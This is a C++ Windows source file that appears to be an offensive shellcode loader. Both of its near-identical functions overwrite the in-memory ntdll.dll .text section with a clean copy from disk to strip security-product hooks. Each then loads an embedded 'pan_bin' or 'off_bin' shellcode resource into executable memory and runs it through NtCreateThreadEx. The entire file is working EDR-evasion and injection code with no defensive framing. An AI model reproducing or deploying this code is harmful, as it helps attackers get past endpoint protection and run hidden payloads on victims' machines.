#define _CRT_SECURE_NO_WARNINGS // Suppress security warnings

#include <iostream>
#include <Windows.h>
#include <psapi.h>
#include "resource.h"
#include "unhook.h"


bool unhookPAN()
{
    // Get resource information
    HRSRC sResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAN_BIN1), L"pan_bin");
    DWORD scSize = SizeofResource(NULL, sResource);
    SIZE_T eSize = scSize;
    HGLOBAL sResData = LoadResource(NULL, sResource);

    HANDLE process = GetCurrentProcess();
    MODULEINFO mi = {};
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

    // Retrieve `ntdll.dll` base address and load it from disk
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

    HANDLE ntdllFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (ntdllFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open ntdll.dll file." << std::endl;
        return false;
    }

    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!ntdllMapping) {
        std::cerr << "Failed to create file mapping for ntdll.dll." << std::endl;
        CloseHandle(ntdllFile);
        return false;
    }

    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
    if (!ntdllMappingAddress) {
        std::cerr << "Failed to map view of ntdll.dll." << std::endl;
        CloseHandle(ntdllMapping);
        CloseHandle(ntdllFile);
        return false;
    }

    // Unhook the .text section by copying from disk version to in-memory version
    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)hookedSectionHeader->Name, ".text")) {
            DWORD oldProtection = 0;
            VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);

            // Copy original .text section from disk
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress),
                (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress),
                hookedSectionHeader->Misc.VirtualSize);

            VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }

    UnmapViewOfFile(ntdllMappingAddress);
    CloseHandle(ntdllMapping);
    CloseHandle(ntdllFile);

    // Resolve NT APIs from unhooked ntdll.dll
    NtWriteVirtualMemory pNtWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(ntdllModule, "NtWriteVirtualMemory");
    NtAllocateVirtualMemory pNtAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(ntdllModule, "NtAllocateVirtualMemory");
    NtCreateThreadEx pNtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(ntdllModule, "NtCreateThreadEx");

  
    PVOID remoteMemory = NULL;
    NTSTATUS status = pNtAllocateVirtualMemory(NtCurrentProcess(), &remoteMemory, 0, &eSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to allocate memory in target process." << std::endl;
    
        return false;
    }

    status = pNtWriteVirtualMemory(NtCurrentProcess(), remoteMemory, sResData, eSize, NULL);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to write shellcode to target process memory." << std::endl;
        pNtAllocateVirtualMemory(NtCurrentProcess(), &remoteMemory, 0, &eSize, MEM_RELEASE, 0);
        return false;
    }

    HANDLE hThread = NULL;
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), remoteMemory, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to create remote thread in target process." << std::endl;
        pNtAllocateVirtualMemory(NtCurrentProcess(), &remoteMemory, 0, &eSize, MEM_RELEASE, 0);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    std::cout << "[+] Injection completed successfully." << std::endl;

    return true;

}

bool unhookOFF()
{

    // Get resource information
    HRSRC sResource = FindResource(NULL, MAKEINTRESOURCE(IDR_OFF_BIN1), L"off_bin");
    DWORD scSize = SizeofResource(NULL, sResource);
    SIZE_T eSize = scSize;
    HGLOBAL sResData = LoadResource(NULL, sResource);

    HANDLE process = GetCurrentProcess();
    MODULEINFO mi = {};
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

    // Retrieve `ntdll.dll` base address and load it from disk
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

    HANDLE ntdllFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (ntdllFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open ntdll.dll file." << std::endl;
        return false;
    }

    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!ntdllMapping) {
        std::cerr << "Failed to create file mapping for ntdll.dll." << std::endl;
        CloseHandle(ntdllFile);
        return false;
    }

    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
    if (!ntdllMappingAddress) {
        std::cerr << "Failed to map view of ntdll.dll." << std::endl;
        CloseHandle(ntdllMapping);
        CloseHandle(ntdllFile);
        return false;
    }

    // Unhook the .text section by copying from disk version to in-memory version
    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)hookedSectionHeader->Name, ".text")) {
            DWORD oldProtection = 0;
            VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);

            // Copy original .text section from disk
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress),
                (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress),
                hookedSectionHeader->Misc.VirtualSize);

            VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }

    UnmapViewOfFile(ntdllMappingAddress);
    CloseHandle(ntdllMapping);
    CloseHandle(ntdllFile);

    // Resolve NT APIs from unhooked ntdll.dll
    NtWriteVirtualMemory pNtWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(ntdllModule, "NtWriteVirtualMemory");
    NtAllocateVirtualMemory pNtAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(ntdllModule, "NtAllocateVirtualMemory");
    NtCreateThreadEx pNtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(ntdllModule, "NtCreateThreadEx");


    PVOID remoteMemory = NULL;
    NTSTATUS status = pNtAllocateVirtualMemory(NtCurrentProcess(), &remoteMemory, 0, &eSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to allocate memory in target process." << std::endl;

        return false;
    }

    status = pNtWriteVirtualMemory(NtCurrentProcess(), remoteMemory, sResData, eSize, NULL);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to write shellcode to target process memory." << std::endl;
        pNtAllocateVirtualMemory(NtCurrentProcess(), &remoteMemory, 0, &eSize, MEM_RELEASE, 0);
        return false;
    }

    HANDLE hThread = NULL;
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), remoteMemory, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        std::cerr << "Failed to create remote thread in target process." << std::endl;
        pNtAllocateVirtualMemory(NtCurrentProcess(), &remoteMemory, 0, &eSize, MEM_RELEASE, 0);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    std::cout << "[+] Injection completed successfully." << std::endl;

    return true;

}

